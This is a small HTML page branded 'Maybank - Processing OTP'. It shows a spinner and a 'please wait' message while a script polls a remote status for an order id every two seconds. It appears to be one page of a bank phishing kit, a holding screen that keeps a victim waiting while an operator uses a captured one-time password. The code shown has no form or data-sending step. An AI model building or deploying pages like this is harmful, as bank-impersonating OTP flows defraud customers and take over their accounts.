<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Maybank - Processing OTP</title>
<style>*{box-sizing:border-box}body{margin:0;padding:0;font-family:'Segoe UI',sans-serif;background:#1a1a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
.spinner-container{width:90px;height:90px;background:rgba(255,199,44,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center}
.spinner{width:45px;height:45px;border:4px solid rgba(255,199,44,0.3);border-top:4px solid #ffc72c;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h2{color:#ffc72c;margin-top:25px;font-size:22px}p{color:rgba(255,255,255,0.7);font-size:15px}</style></head>
<body><div class="spinner-container"><div class="spinner"></div></div><h2>Processing OTP...</h2><p>Please wait a moment.</p>
<script src="navigation.js"></script>
<script>
    const orderId = sessionStorage.getItem('orderId');
    if (orderId) setInterval(() => pollStatus(orderId, 'loading_otp'), 2000);
</script>
</body></html>
